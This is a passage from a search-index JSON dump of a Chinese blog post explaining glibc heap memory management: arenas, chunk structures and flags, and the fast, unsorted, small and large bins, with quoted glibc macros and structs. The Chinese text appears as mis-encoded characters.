MALLOC_ALIGN_MASK]; } heap_info; è€Œ malloc_state çš„å®Œæ•´å®šä¹‰å¦‚ä¸‹ï¼š struct malloc_state { /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; }; å…¶ä¸­ INTERNAL_SIZE_T é»˜è®¤å’Œ size_t ç›¸åŒï¼š #ifndef INTERNAL_SIZE_T #define INTERNAL_SIZE_T size_t #endif åœ¨åé¢ä»‹ç» chunk å’Œ bin çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šå‘ç°å…¶ä¸­å‡ ä¸ªå­—æ®µçš„ä½œç”¨ï¼Œmalloc_chunk æˆ‘ä»¬ä¹Ÿä¼šåœ¨åé¢çœ‹åˆ°ã€‚ å¯¹äº arena ä¸­åªæœ‰å•ä¸ªå †çš„æƒ…å†µï¼š å›¾ 2ï½œSingle Heap \" å›¾ 2ï½œSingle Heap å¯¹äº non_main_arena ä¸­æœ‰å¤šä¸ªå †çš„æƒ…å†µï¼š å›¾ 3ï½œMultiple Heap \" å›¾ 3ï½œMultiple Heap æ³¨æ„åˆ°æœ‰å¤šä¸ªå †çš„æƒ…å†µä¸‹ï¼Œæ—§çš„å †çš„ Top chunk ä¼šè¢«è®¤ä¸ºæ˜¯æ™®é€šçš„ç©ºé—²å—ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:5:0","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Chunk çš„ç»“æ„ é€šä¿—åœ°è¯´ï¼Œä¸€å—ç”±åˆ†é…å™¨åˆ†é…çš„å†…å­˜å—å«åšä¸€ä¸ª chunkï¼ŒåŒ…å«äº†å…ƒæ•°æ®å’Œç”¨æˆ·æ•°æ®ã€‚å…·ä½“ä¸€ç‚¹ï¼Œchunk å®Œæ•´å®šä¹‰å¦‚ä¸‹ï¼š struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; typedef struct malloc_chunk* mchunkptr; è¿™é‡Œå‡ºç°çš„ 6 ä¸ªå­—æ®µå‡ä¸ºå…ƒæ•°æ®ã€‚ ä¸€ä¸ª chunk å¯ä»¥æ˜¯ä»¥ä¸‹å‡ ç§ç±»å‹ä¹‹ä¸€ï¼š å·²åˆ†é…çš„ï¼ˆAllocated chunkï¼‰ ç©ºé—²çš„ï¼ˆFree chunkï¼‰ Top chunk Last Remainder chunk æˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªæ¥çœ‹ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:6:0","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Allocated chunk å›¾ 4ï½œAllocated chunk \" å›¾ 4ï½œAllocated chunk ç¬¬ä¸€ä¸ªéƒ¨åˆ†ï¼ˆ32 ä½ä¸Š 4Bï¼Œ64 ä½ä¸Š 8Bï¼‰å«åš prev_sizeï¼Œåªæœ‰åœ¨å‰ä¸€ä¸ª chunk ç©ºé—²æ—¶æ‰è¡¨ç¤ºå‰ä¸€ä¸ªå—çš„å¤§å°ï¼Œå¦åˆ™è¿™é‡Œå°±æ˜¯æ— æ•ˆçš„ï¼Œå¯ä»¥è¢«å‰ä¸€ä¸ªå—å¾ç”¨ï¼ˆå­˜å‚¨ç”¨æˆ·æ•°æ®ï¼‰ã€‚ è¿™é‡Œçš„å‰ä¸€ä¸ª chunkï¼ŒæŒ‡å†…å­˜ä¸­ç›¸é‚»çš„å‰ä¸€ä¸ªï¼Œè€Œä¸æ˜¯ freelist é“¾è¡¨ä¸­çš„å‰ä¸€ä¸ªã€‚PREV_INUSE ä»£è¡¨çš„ â€œå‰ä¸€ä¸ª chunkâ€ åŒç†ã€‚ ç¬¬äºŒä¸ªéƒ¨åˆ†çš„é«˜ä½å­˜å‚¨å½“å‰ chunk çš„å¤§å°ï¼Œä½ 3 ä½åˆ†åˆ«è¡¨ç¤ºï¼š P: PREV_INUSE ä¹‹å‰çš„ chunk å·²ç»è¢«åˆ†é…åˆ™ä¸º 1 M: IS_MMAPED å½“å‰ chunk æ˜¯ mmap() å¾—åˆ°çš„åˆ™ä¸º 1 N: NON_MAIN_ARENA å½“å‰ chunk åœ¨ non_main_arena é‡Œåˆ™ä¸º 1 å¯¹åº”æºç å¦‚ä¸‹ï¼š /* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */ #define PREV_INUSE 0x1 /* extract inuse bit of previous chunk */ #define prev_inuse(p) ((p)-\u003esize \u0026 PREV_INUSE) /* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */ #define IS_MMAPPED 0x2 /* check for mmap()'ed chunk */ #define chunk_is_mmapped(p) ((p)-\u003esize \u0026 IS_MMAPPED) /* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */ #define NON_MAIN_ARENA 0x4 /* check for chunk from non-main arena */ #define chunk_non_main_arena(p) ((p)-\u003esize \u0026 NON_MAIN_ARENA) ä½ å¯èƒ½ä¼šæœ‰å‡ ä¸ªå›°æƒ‘ï¼š fdã€bkã€fd_nextsizeã€bk_nextsize è¿™å‡ ä¸ªå­—æ®µå»å“ªé‡Œäº†ï¼Ÿ å¯¹äºå·²åˆ†é…çš„ chunk æ¥è¯´å®ƒä»¬æ²¡ç”¨ï¼Œæ‰€ä»¥ä¹Ÿè¢«å¾ç”¨äº†ï¼Œç”¨æ¥å­˜å‚¨ç”¨æˆ·æ•°æ®ã€‚ ä¸ºä»€ä¹ˆç¬¬äºŒä¸ªéƒ¨åˆ†çš„ä½ 3 ä½å°±è¿™ä¹ˆè¢«åäº†è€Œä¸ä¼šå½±å“ sizeï¼Ÿ è¿™æ˜¯å› ä¸º malloc ä¼šå°†ç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°è½¬åŒ–ä¸ºå®é™…åˆ†é…çš„å†…å­˜ï¼Œä»¥æ­¤æ¥æ»¡è¶³ï¼ˆè‡³å°‘ï¼‰8 å­—èŠ‚å¯¹é½çš„è¦æ±‚ï¼ŒåŒæ—¶ç•™å‡ºé¢å¤–ç©ºé—´å­˜æ”¾ chunk å¤´éƒ¨ã€‚ç”±äºï¼ˆè‡³å°‘ï¼‰8 å­—èŠ‚å¯¹é½äº†ï¼Œä½ 3 ä½è‡ªç„¶å°±æ²¡ç”¨äº†ã€‚åœ¨è·å–çœŸæ­£çš„ size æ—¶ï¼Œä¼šå¿½ç•¥ä½ 3 ä½ï¼š /* Bits to mask off when extracting size Note: IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */ #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) /* Get size, ignoring use bits */ #define chunksize(p) ((p)-\u003esize \u0026 ~(SIZE_BITS)) malloc æ˜¯å¦‚ä½•å°†ç”³è¯·çš„å¤§å°è½¬åŒ–ä¸ºå®é™…åˆ†é…çš„å¤§å°çš„å‘¢ï¼Ÿ æ ¸å¿ƒåœ¨äº request2size å®ï¼š /* pad request bytes into a usable size -- internal version */ #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \u003cMINSIZE) ? \\ MINSIZE : \\ ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \u0026 ~MALLOC_ALIGN_MASK) å…¶ä¸­ç”¨åˆ°çš„å…¶å®ƒå®å®šä¹‰ï¼š # define MALLOC_ALIGNMENT (2 *SIZE_SZ) /* The corresponding bit mask value */ #define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) /* The smallest size we can malloc is an aligned minimal chunk */ #define MINSIZE \\ (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) \u0026 ~MALLOC_ALIGN_MASK)) è¿™é‡Œè¿˜æœ‰ä¸€ä¸ª mem æŒ‡é’ˆï¼Œæ˜¯åšä»€ä¹ˆç”¨çš„ï¼Ÿ è¿™æ˜¯è°ƒç”¨ malloc æ—¶è¿”å›ç»™ç”¨æˆ·çš„æŒ‡é’ˆã€‚å®é™…ä¸Šï¼ŒçœŸæ­£çš„ chunk æ˜¯ä» chunk æŒ‡é’ˆå¼€å§‹çš„ã€‚ /* The corresponding word size */ #define SIZE_SZ (sizeof(INTERNAL_SIZE_T)) /* conversion from malloc headers to user pointers, and back */ #define chunk2mem(p) ((void*)((char*)(p) + 2*SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ)) ç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°å°±æ˜¯ç”¨æˆ·æ•°æ®å¯ç”¨çš„å†…å­˜å¤§å°å—ï¼Ÿ ä¸ä¸€å®šï¼ŒåŸå› è¿˜æ˜¯å­—èŠ‚å¯¹é½é—®é¢˜ã€‚è¦è·å¾—å¯ç”¨å†…å­˜å¤§å°ï¼Œå¯ä»¥ç”¨ malloc_usable_size() è·å¾—ï¼Œå…¶æ ¸å¿ƒå‡½æ•°æ˜¯ï¼š static size_t musable (void *mem) { mchunkptr p; if (mem != 0) { p = mem2chunk (mem); if (__builtin_expect (using_malloc_checking == 1, 0)) return malloc_check_get_size (p); if (chunk_is_mmapped (p)) return chunksize (p) - 2 * SIZE_SZ; else if (inuse (p)) return chunksize (p) - SIZE_SZ; } return 0; } ","date":"2019-12-08","objectID":"/glibc-heap/:6:1","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Free chunk å›¾ 5ï½œFree chunk \" å›¾ 5ï½œFree chunk é¦–å…ˆï¼Œprev_size å¿…å®šå­˜å‚¨ä¸Šä¸€ä¸ªå—çš„ç”¨æˆ·æ•°æ®ï¼Œå› ä¸º Free chunk çš„ä¸Šä¸€ä¸ªå—å¿…å®šæ˜¯ Allocated chunkï¼Œå¦åˆ™ä¼šå‘ç”Ÿåˆå¹¶ã€‚ æ¥ç€ï¼Œå¤šå‡ºæ¥çš„ fd æŒ‡å‘åŒä¸€ä¸ª bin ä¸­çš„å‰ä¸€ä¸ª Free chunkï¼Œbk æŒ‡å‘åŒä¸€ä¸ª bin ä¸­çš„åä¸€ä¸ª Free chunkã€‚ è¿™é‡Œæåˆ°äº† binï¼Œæˆ‘ä»¬å°†åœ¨åé¢ä»‹ç»ã€‚ æ­¤å¤–ï¼Œå¯¹äº large bins ä¸­çš„ Free chunkï¼Œfd_nextsize ä¸ bk_nextsize ä¼šç”Ÿæ•ˆï¼Œåˆ†åˆ«æŒ‡å‘ large bins ä¸­å‰ä¸€ä¸ªï¼ˆæ›´å¤§çš„ï¼‰å’Œåä¸€ä¸ªï¼ˆæ›´å°çš„ï¼‰ç©ºé—²å—ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:6:2","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Top chunk ä¸€ä¸ª arena é¡¶éƒ¨çš„ chunk å«åš Top chunkï¼Œå®ƒä¸å±äºä»»ä½• binã€‚å½“æ‰€æœ‰ bin ä¸­éƒ½æ²¡æœ‰ç©ºé—²çš„å¯ç”¨ chunk æ—¶ï¼Œæˆ‘ä»¬åˆ‡å‰² Top chunk æ¥æ»¡è¶³ç”¨æˆ·çš„å†…å­˜ç”³è¯·ã€‚å‡è®¾ Top chunk å½“å‰å¤§å°ä¸º N å­—èŠ‚ï¼Œç”¨æˆ·ç”³è¯·äº† K å­—èŠ‚çš„å†…å­˜ï¼Œé‚£ä¹ˆ Top chunk å°†è¢«åˆ‡å‰²ä¸ºï¼š ä¸€ä¸ª K å­—èŠ‚çš„ chunkï¼Œåˆ†é…ç»™ç”¨æˆ· ä¸€ä¸ª N-K å­—èŠ‚çš„ chunkï¼Œç§°ä¸º Last Remainder chunk åè€…æˆä¸ºæ–°çš„ Top chunkã€‚å¦‚æœè¿ Top chunk éƒ½ä¸å¤Ÿç”¨äº†ï¼Œé‚£ä¹ˆï¼š åœ¨ main_arena ä¸­ï¼Œç”¨ brk() æ‰©å¼  Top chunk åœ¨ non_main_arena ä¸­ï¼Œç”¨ mmap() åˆ†é…æ–°çš„å † æ³¨ï¼šTop chunk çš„ PREV_INUSE ä½æ€»æ˜¯ 1 ","date":"2019-12-08","objectID":"/glibc-heap/:6:3","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Last Remainder chunk å½“éœ€è¦åˆ†é…ä¸€ä¸ªæ¯”è¾ƒå°çš„ K å­—èŠ‚çš„ chunk ä½†æ˜¯ small bins ä¸­æ‰¾ä¸åˆ°æ»¡è¶³è¦æ±‚çš„ï¼Œä¸” Last Remainder chunk çš„å¤§å° N èƒ½æ»¡è¶³è¦æ±‚ï¼Œé‚£ä¹ˆ Last Remainder chunk å°†è¢«åˆ‡å‰²ä¸ºï¼š ä¸€ä¸ª K å­—èŠ‚çš„ chunkï¼Œåˆ†é…ç»™ç”¨æˆ· ä¸€ä¸ª N-K å­—èŠ‚çš„ chunkï¼Œæˆä¸ºæ–°çš„ Last Remainder chunk å®ƒçš„å­˜åœ¨ä½¿å¾—è¿ç»­çš„å°ç©ºé—´å†…å­˜ç”³è¯·ï¼Œåˆ†é…åˆ°çš„å†…å­˜éƒ½æ˜¯ç›¸é‚»çš„ï¼Œä»è€Œè¾¾åˆ°äº†æ›´å¥½çš„å±€éƒ¨æ€§ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:6:4","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Bin çš„ç»“æ„ bin æ˜¯å®ç°äº†ç©ºé—²é“¾è¡¨çš„æ•°æ®ç»“æ„ï¼Œç”¨æ¥å­˜å‚¨ç©ºé—² chunkï¼Œå¯åˆ†ä¸ºï¼š 10 ä¸ª fast binsï¼Œå­˜å‚¨åœ¨ fastbinsY ä¸­ 1 ä¸ª unsorted binï¼Œå­˜å‚¨åœ¨ bin[1] 62 ä¸ª small binsï¼Œå­˜å‚¨åœ¨ bin[2] è‡³ bin[63] 63 ä¸ª large binsï¼Œå­˜å‚¨åœ¨ bin[64] è‡³ bin[126] è¿˜æ˜¯ä¸€ä¸ªä¸€ä¸ªæ¥çœ‹ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:7:0","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"fast bins éå¸¸åƒé«˜é€Ÿç¼“å­˜ cacheï¼Œä¸»è¦ç”¨äºæé«˜å°å†…å­˜åˆ†é…æ•ˆç‡ã€‚ç›¸é‚»ç©ºé—² chunk ä¸ä¼šè¢«åˆå¹¶ï¼Œè¿™ä¼šå¯¼è‡´å¤–éƒ¨ç¢ç‰‡å¢å¤šä½†æ˜¯ free æ•ˆç‡æå‡ã€‚æ³¨æ„ fast bins æ˜¯ 10 ä¸ª LIFO çš„å•é“¾è¡¨ã€‚æœ€åä¸‰ä¸ªé“¾è¡¨ä¿ç•™æœªä½¿ç”¨ã€‚ chunk å¤§å°ï¼ˆå« chunk å¤´éƒ¨ï¼‰ï¼š0x10-0x40ï¼ˆ64 ä½ 0x20-0x80ï¼‰Bï¼Œç›¸é‚» bin å­˜æ”¾çš„å¤§å°ç›¸å·® 0x8ï¼ˆ0x10ï¼‰Bã€‚ å›¾ 6ï½œfast bins \" å›¾ 6ï½œfast bins æ³¨ï¼šåŠ å…¥ fast bins çš„ chunkï¼Œå®ƒçš„ IN_USE ä½ï¼ˆå‡†ç¡®åœ°è¯´ï¼Œæ˜¯ä¸‹ä¸€ä¸ª chunk çš„ PREV_INUSE ä½ï¼‰ä¾ç„¶æ˜¯ 1ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç›¸é‚»çš„ â€œç©ºé—²â€chunk ä¸ä¼šè¢«åˆå¹¶ï¼Œå› ä¸ºå®ƒä»¬æ ¹æœ¬ä¸ä¼šè¢«è®¤ä¸ºæ˜¯ç©ºé—²çš„ã€‚ å…³äº fastbin æœ€å¤§å¤§å°ï¼Œå‚è§å® DEFAULT_MXFASTï¼š #ifndef DEFAULT_MXFAST #define DEFAULT_MXFAST (64 * SIZE_SZ / 4) #endif åœ¨åˆå§‹åŒ–æ—¶ï¼Œè¿™ä¸ªå€¼ä¼šè¢«èµ‹å€¼ç»™å…¨å±€å˜é‡ global_max_fastã€‚ ç”³è¯· fast chunk æ—¶éµå¾ª first fit åŸåˆ™ã€‚é‡Šæ”¾ä¸€ä¸ª fast chunk æ—¶ï¼Œé¦–å…ˆæ£€æŸ¥å®ƒçš„å¤§å°ä»¥åŠå¯¹åº” fastbin æ­¤æ—¶çš„ç¬¬ä¸€ä¸ª chunk old çš„å¤§å°æ˜¯å¦åˆæ³•ï¼Œéšåå®ƒä¼šè¢«æ’å…¥åˆ°å¯¹åº” fastbin çš„é“¾è¡¨å¤´ï¼Œæ­¤æ—¶å…¶ fd æŒ‡å‘ oldã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:7:1","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"unsorted bin éå¸¸åƒç¼“å†²åŒº bufferï¼Œå¤§å°è¶…è¿‡ fast bins é˜ˆå€¼çš„ chunk è¢«é‡Šæ”¾æ—¶ä¼šåŠ å…¥åˆ°è¿™é‡Œï¼Œè¿™ä½¿å¾— ptmalloc2 å¯ä»¥å¤ç”¨æœ€è¿‘é‡Šæ”¾çš„ chunkï¼Œä»è€Œæå‡æ•ˆç‡ã€‚ unsorted bin æ˜¯ä¸€ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ï¼Œchunk å¤§å°ï¼šå¤§äº global_max_fastã€‚ å›¾ 7ï½œunsorted bin \" å›¾ 7ï½œunsorted bin å½“ç¨‹åºç”³è¯·å¤§äº global_max_fast å†…å­˜æ—¶ï¼Œåˆ†é…å™¨éå† unsorted binï¼Œæ¯æ¬¡å–æœ€åçš„ä¸€ä¸ª unsorted chunkã€‚ å¦‚æœ unsorted chunk æ»¡è¶³ä»¥ä¸‹å››ä¸ªæ¡ä»¶ï¼Œå®ƒå°±ä¼šè¢«åˆ‡å‰²ä¸ºä¸€å—æ»¡è¶³ç”³è¯·å¤§å°çš„ chunk å’Œå¦ä¸€å—å‰©ä¸‹çš„ chunkï¼Œå‰è€…è¿”å›ç»™ç¨‹åºï¼Œåè€…é‡æ–°å›åˆ° unsorted binã€‚ ç”³è¯·å¤§å°å±äº small bin èŒƒå›´ unosrted bin ä¸­åªæœ‰è¯¥ chunk è¿™ä¸ª chunk åŒæ ·ä¹Ÿæ˜¯ last remainder chunk åˆ‡å‰²ä¹‹åçš„å¤§å°ä¾ç„¶å¯ä»¥ä½œä¸ºä¸€ä¸ª chunk å¦åˆ™ï¼Œä» unsorted bin ä¸­åˆ é™¤ unsorted chunkã€‚ è‹¥ unsorted chunk æ°å¥½å’Œç”³è¯·å¤§å°ç›¸åŒï¼Œåˆ™ç›´æ¥è¿”å›è¿™ä¸ª chunk è‹¥ unsorted chunk å±äº small bin èŒƒå›´ï¼Œæ’å…¥åˆ°ç›¸åº” small bin è‹¥ unsorted chunk å±äº large bin èŒƒå›´ï¼Œåˆ™è·³è½¬åˆ° 3ã€‚ æ­¤æ—¶ unsorted chunk å±äº large bin èŒƒå›´ã€‚ è‹¥å¯¹åº” large bin ä¸ºç©ºï¼Œç›´æ¥æ’å…¥ unsorted chunkï¼Œå…¶ fd_nextsize ä¸ bk_nextsize æŒ‡å‘è‡ªèº«ã€‚ å¦åˆ™ï¼Œè·³è½¬åˆ° 4ã€‚ åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬éœ€æŒ‰å¤§å°é™åºæ’å…¥å¯¹åº” large binã€‚ è‹¥å¯¹åº” large bin æœ€åä¸€ä¸ª chunk å¤§äº unsorted chunkï¼Œåˆ™æ’å…¥åˆ°æœ€å å¦åˆ™ï¼Œä»å¯¹åº” large bin ç¬¬ä¸€ä¸ª chunk å¼€å§‹ï¼Œæ²¿ fd_nextsizeï¼ˆå³å˜å°ï¼‰æ–¹å‘éå†ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ª chunk fwdï¼Œå…¶å¤§å°å°äºç­‰äº unsorted chunk çš„å¤§å° è‹¥ fwd å¤§å°ç­‰äº unsorted chunk å¤§å°ï¼Œåˆ™æ’å…¥åˆ° fwd åé¢ å¦åˆ™ï¼Œæ’å…¥åˆ° fwd å‰é¢ ç›´åˆ°æ‰¾åˆ°æ»¡è¶³è¦æ±‚çš„ unsorted chunkï¼Œæˆ–æ— æ³•æ‰¾åˆ°ï¼Œå» top chunk åˆ‡å‰²ä¸ºæ­¢ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:7:2","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"small bins å°äº 0x200ï¼ˆ0x400ï¼‰B çš„ chunk å«åš small chunkï¼Œè€Œ small bins å¯ä»¥å­˜æ”¾çš„å°±æ˜¯è¿™äº› small chunksã€‚chunk å¤§å°åŒæ ·æ˜¯ä» 16B å¼€å§‹æ¯æ¬¡ + 8Bã€‚ small bins æ˜¯ 62 ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå¹¶ä¸”æ˜¯ FIFO çš„ï¼Œè¿™ç‚¹å’Œ fast bins ç›¸åã€‚åŒæ ·ç›¸åçš„æ˜¯ç›¸é‚»çš„ç©ºé—² chunk ä¼šè¢«åˆå¹¶ã€‚ chunk å¤§å°ï¼š0x10-0x1f0Bï¼ˆ0x20-0x3f0ï¼‰ï¼Œç›¸é‚» bin å­˜æ”¾çš„å¤§å°ç›¸å·® 0x8ï¼ˆ0x10ï¼‰Bã€‚ é‡Šæ”¾é fast chunk æ—¶ï¼ŒæŒ‰ä»¥ä¸‹æ­¥éª¤æ‰§è¡Œï¼š è‹¥å‰ä¸€ä¸ªç›¸é‚» chunk ç©ºé—²ï¼Œåˆ™åˆå¹¶ï¼Œè§¦å‘å¯¹å‰ä¸€ä¸ªç›¸é‚» chunk çš„ unlink æ“ä½œ è‹¥ä¸‹ä¸€ä¸ªç›¸é‚» chunk æ˜¯ top chunkï¼Œåˆ™åˆå¹¶å¹¶ç»“æŸï¼›å¦åˆ™ç»§ç»­æ‰§è¡Œ 3 è‹¥ä¸‹ä¸€ä¸ªç›¸é‚» chunk ç©ºé—²ï¼Œåˆ™åˆå¹¶ï¼Œè§¦å‘å¯¹ä¸‹ä¸€ä¸ªç›¸é‚» chunk çš„ unlink æ“ä½œï¼›å¦åˆ™ï¼Œè®¾ç½®ä¸‹ä¸€ä¸ªç›¸é‚» chunk çš„ PREV_INUSE ä¸º 0 å°†ç°åœ¨çš„ chunk æ’å…¥ unsorted binã€‚ è‹¥ size è¶…è¿‡äº† FASTBIN_CONSOLIDATION_THRESHOLDï¼Œåˆ™å°½å¯èƒ½åœ°åˆå¹¶ fastbin ä¸­çš„ chunkï¼Œæ”¾å…¥ unsorted binã€‚è‹¥ top chunk å¤§å°è¶…è¿‡äº† mp_.trim_thresholdï¼Œåˆ™å½’è¿˜éƒ¨åˆ†å†…å­˜ç»™ OSã€‚ #ifndef DEFAULT_TRIM_THRESHOLD #define DEFAULT_TRIM_THRESHOLD (128 * 1024) #endif #define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) ","date":"2019-12-08","objectID":"/glibc-heap/:7:3","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"large bins å¤§äºç­‰äº 0x200ï¼ˆ0x400ï¼‰B çš„ chunk å«åš large chunkï¼Œè€Œ large bins å¯ä»¥å­˜æ”¾çš„å°±æ˜¯è¿™äº› large chunksã€‚ large bins æ˜¯ 63 ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ’å…¥å’Œåˆ é™¤å¯ä»¥å‘ç”Ÿåœ¨ä»»æ„ä½ç½®ï¼Œç›¸é‚»ç©ºé—² chunk ä¹Ÿä¼šè¢«åˆå¹¶ã€‚chunk å¤§å°å°±æ¯”è¾ƒå¤æ‚äº†ï¼š å‰ 32 ä¸ª binsï¼šä» 0x200B å¼€å§‹æ¯æ¬¡ + 0x40B æ¥ä¸‹æ¥çš„ 16 ä¸ª binsï¼šæ¯æ¬¡ + 0x200B æ¥ä¸‹æ¥çš„ 8 ä¸ª binsï¼šæ¯æ¬¡ + 0x1000B æ¥ä¸‹æ¥çš„ 4 ä¸ª binsï¼šæ¯æ¬¡ + 0x8000B æ¥ä¸‹æ¥çš„ 2 ä¸ª binsï¼šæ¯æ¬¡ + 0x40000B æœ€åçš„ 1 ä¸ª binï¼šåªæœ‰ä¸€ä¸ª chunkï¼Œå¤§å°å’Œ large bins å‰©ä½™çš„å¤§å°ç›¸åŒ æ³¨æ„åŒä¸€ä¸ª bin ä¸­çš„ chunks ä¸æ˜¯ç›¸åŒå¤§å°çš„ï¼ŒæŒ‰å¤§å°é™åºæ’åˆ—ã€‚è¿™å’Œä¸Šé¢çš„å‡ ç§ bins éƒ½ä¸ä¸€æ ·ã€‚è€Œåœ¨å–å‡º chunk æ—¶ï¼Œä¹Ÿéµå¾ª best fit åŸåˆ™ï¼Œå–å‡ºæ»¡è¶³å¤§å°çš„æœ€å° chunkã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:7:4","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"å†…å­˜åˆ†é…æµç¨‹ æˆ‘è§‰å¾—è¿™ç±»å¤æ‚çš„æµç¨‹æ¯”è¾ƒéœ€è¦é æµç¨‹å›¾æ¥ç†è§£ï¼Œå› æ­¤æˆ‘ç”»äº†ä¸€ä¸‹ï¼š å›¾ 8ï½œProcedure of malloc() \" å›¾ 8ï½œProcedure of malloc() ç›¸å…³å®ï¼š #define NBINS 128 #define NSMALLBINS 64 #define SMALLBIN_WIDTH MALLOC_ALIGNMENT #define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT\u003e 2 * SIZE_SZ) #define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) #define in_smallbin_range(sz) \\ ((unsigned long) (sz) \u003c(unsigned long) MIN_LARGE_SIZE) #ifndef DEFAULT_MMAP_THRESHOLD_MIN #define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) #endif #ifndef DEFAULT_MMAP_THRESHOLD #define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN #endif ","date":"2019-12-08","objectID":"/glibc-heap/:8:0","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ 